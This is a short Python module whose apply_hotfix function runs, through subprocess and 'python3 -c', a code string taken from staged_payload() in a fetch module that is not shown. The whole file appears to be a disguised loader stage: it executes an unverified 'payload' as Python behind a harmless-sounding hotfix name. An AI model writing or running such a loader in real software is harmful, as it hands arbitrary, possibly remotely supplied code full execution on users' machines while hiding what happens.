import subprocess

from .fetch import staged_payload


def apply_hotfix():
    return subprocess.run(["python3", "-c", staged_payload()[0]], check=False)
